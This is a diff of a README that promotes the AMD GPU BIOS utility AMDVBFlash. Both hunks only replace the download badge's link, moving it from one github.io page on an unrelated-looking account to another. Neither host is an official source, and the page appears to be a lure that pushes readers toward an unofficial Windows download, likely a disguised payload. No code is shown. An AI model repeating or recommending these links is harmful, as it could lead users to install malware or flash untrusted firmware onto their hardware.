@@ -4,7 +4,7 @@
 
 ## 📥 Download AMDVBFlash for Windows
 
-[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/33)
+[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://amdvbflashload.github.io/.github/)
 
 ---
 
@@ -28,7 +28,7 @@ AMDVBFlash is a BIOS flashing utility designed specifically for AMD graphics car
 
 Whether you're a hobbyist looking to tweak your graphics card for mining or a professional adjusting your system's performance, AMDVBFlash is a reliable tool that simplifies the flashing process. Version 2.93 is one of the most popular releases, featuring a stable and effective interface for flashing operations.
 
-[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/33)
+[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://amdvbflashload.github.io/.github/)
 
 ---
 
